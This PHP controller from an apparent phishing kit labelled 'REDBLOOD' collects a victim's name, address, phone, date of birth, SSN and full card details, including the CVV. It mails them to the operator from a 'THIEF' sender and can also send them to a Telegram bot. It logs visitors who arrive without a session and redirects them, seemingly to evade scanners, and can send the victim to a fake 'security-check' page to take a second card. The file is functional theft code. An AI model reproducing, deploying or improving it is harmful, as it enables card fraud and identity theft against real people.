<?php
defined("ALLOW") or exit('No direct script access allowed');

class Billing
{
	public $goRBLD;
	public function __construct()
	{
		$this->goRBLD = new goRBLD();

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 2)) {

			write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Page Without Session\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		if ($this->goRBLD->is_mobile) {
			echo view('mobile/billing');
		} else {
			echo view('pc/billing');
		}
	}

	public function first()
	{
		if (isset($_POST['firstname'])) {
			$_SESSION['firstname'] = trim($_POST['firstname']);
		}
		if (isset($_POST['lastname'])) {
			$_SESSION['lastname'] = trim($_POST['lastname']);
		}
		if (isset($_POST['address'])) {
			$_SESSION['address'] = trim($_POST['address']);
		}
		if (isset($_POST['address2'])) {
			$_SESSION['address2'] = trim($_POST['address2']);
		}
		if (isset($_POST['cityp'])) {
			$_SESSION['cityp'] = trim($_POST['cityp']);
		}
		if (isset($_POST['state'])) {
			$_SESSION['state'] = trim($_POST['state']);
		}
		if (isset($_POST['zip'])) {
			$_SESSION['zip'] = trim($_POST['zip']);
		}
		if (isset($_POST['phone'])) {
			$_SESSION['phone'] = trim($_POST['phone']);
		}
		if (isset($_POST['dob'])) {
			$_SESSION['dob'] = trim($_POST['dob']);
		}
		if (isset($_POST['ssn'])) {
			$_SESSION['ssn'] = trim($_POST['ssn']);
		}
		if ($this->goRBLD->is_mobile) {
			echo view('mobile/card');
		} else {
			echo view('pc/card');
		}
	}

	public function process()
	{
		if (isset($_POST) && isset($_SESSION)) {
			$firstname = $_SESSION['firstname'];
			$lastname = $_SESSION['lastname'];
			$address = $_SESSION['address'];
			$address2 = $_SESSION['address2'];
			$cityP = $_SESSION['cityp'];
			$state = $_SESSION['state'];
			$zipCode = $_SESSION['zip'];
			$dob = $_SESSION['dob'];
			$ssn = $_SESSION['ssn'];
			$phone = $_SESSION['phone'];
			$cardHolder = $firstname . ' ' . $lastname;
			$cardNumber = $_POST['ccn'];
			$cardNumber = str_replace(" ", "", $cardNumber);
			$cardCvv = $_POST['cvv'];
			$cardExpM = $_POST['expmonth'];
			$cardExpY = $_POST['expyear'];
			$cardExp = substr($cardExpY, 2);
			$_SESSION['ccn'] = $cardNumber;

			$ccN = substr($cardNumber, 0, 6);
			$bin = look_bin($cardNumber);

			$message =
				"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: REDBLOOD ::</span></strong>

<strong>:: GET CARD #1 ::</strong>
			
# BIN 			  : {$bin}
# Cardholder name : {$cardHolder}
# Card number 	  : {$cardNumber}
# Expiration 	  : {$cardExpM}/{$cardExpY}
# Cvv/Cvv2	  	  : {$cardCvv}
# Check format 	  : {$cardNumber}|{$cardExpM}|{$cardExp}|{$cardCvv}

<strong>:: VICTIM INFO ::</strong>
			
# Address 1  : {$address}
# Address 2  : {$address2}
# City 	   	 : {$cityP}
# State    	 : {$state}
# Zip code 	 : {$zipCode}
# Phone    	 : {$phone}
# SSN 	   	 : {$ssn}
# DOB	   	 : {$dob}

<strong>:: VISITOR DETAIL ::</strong>

# Date &amp; Time  : " . _date() . "  
# Device       : {$this->goRBLD->platform}
# Browser      : {$this->goRBLD->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['region']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->goRBLD->ip_address}
# User agent   : {$this->goRBLD->agent}

</pre>
</fieldset>
</pre>";

			$subject = "1 :: {$bin} :: [ {$_SESSION['country']} - {$this->goRBLD->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: THIEF <thief@redblood.com>";
			@mail(_config('RESULT'), $subject, $message, $headers);
			if (_config('TELEGRAM') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . telex('token') . '/sendMessage?chat_id=' . telex('idtelegram') . '&text=' . urlencode(strip_tags($message)));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				$x = curl_exec($c);
				curl_close($c);
			}

			write(FCPATH . 'REDBLOOD/Static/log_cc.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Get Card #1\r\n");

			if (_config('DOUBLECARD') == 'on') {
				$_SESSION['access'] = 3;
				redirect(base_url() . 'security-check/payment/#errorId=' . md5(time()));
			} else {
				$_SESSION['access'] = 4;
				redirect(base_url() . 'security-check/finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}